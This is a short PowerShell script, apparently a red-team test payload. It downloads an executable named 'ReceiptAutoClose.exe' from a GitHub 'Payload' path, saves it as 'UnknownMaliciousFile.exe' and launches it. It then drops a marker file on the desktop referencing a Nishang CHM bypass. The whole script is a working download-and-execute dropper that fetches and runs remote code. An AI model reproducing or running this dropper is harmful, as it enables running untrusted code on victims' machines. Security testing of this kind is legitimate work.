$url = 'https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/ReceiptAutoClose.exe'
$output = "UnknownMaliciousFile.exe"
$start_time = Get-Date

[ Net.ServicePointManager ]::SecurityProtocol  = [Net.SecurityProtocolType]::Tls12 

wget $url -outfile $output

Write-Output "Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)"

Start-Process -FilePath "UnknownMaliciousFile.exe"

$DesktopPath = [Environment]::GetFolderPath('Desktop');echo "NishangChmBypass." >> $DesktopPath\\WLtester.txt
